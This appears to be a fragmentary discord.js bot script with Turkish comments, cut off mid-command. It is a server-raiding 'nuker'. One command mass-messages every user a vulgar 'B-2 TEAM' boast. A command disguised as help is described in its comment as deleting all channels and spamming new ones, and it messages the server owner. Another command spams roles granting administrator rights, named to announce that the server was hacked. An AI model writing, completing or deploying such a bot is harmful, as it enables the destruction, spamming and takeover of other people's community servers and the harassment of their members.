...
client.on("message", async msg => {
  if (msg.content === "!duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR
    ...
    await msg.client.users
      .forEach(users =>
        users.send(
          "`B-2 TEAM` **Her Daim Siker** :wink:"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
...
client.on("message", async msg => {
  if (msg.content === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    ...
    await msg.guild.createChannel("B-2 TEAM", {
      type: "text"
    });
    ...
    await msg.guild.owner.send("`B-2 TEAM` Her Daim Siker!");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
  ...
  if (msg.content === "!rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "Bu Sunucu B-2 TEAM Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Bu SunucuB-2 TEAM Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
